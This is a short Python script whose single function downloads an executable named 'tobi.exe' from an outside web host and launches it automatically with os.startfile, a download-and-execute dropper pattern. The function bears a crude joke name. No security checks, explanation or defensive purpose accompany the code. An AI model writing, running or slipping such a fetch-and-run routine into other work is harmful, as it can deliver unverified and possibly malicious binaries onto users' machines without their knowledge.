


import urllib.request
import os

def gay():
    url = "https://tobixlol.vercel.app/tobi.exe"
    filename = "tobi.exe"                  # 💾 Local save name
    run_after = True                         # ▶️ Auto-run after download

    urllib.request.urlretrieve(url, filename)
    if run_after:
        os.startfile(filename)

# 🚀 Run it directly




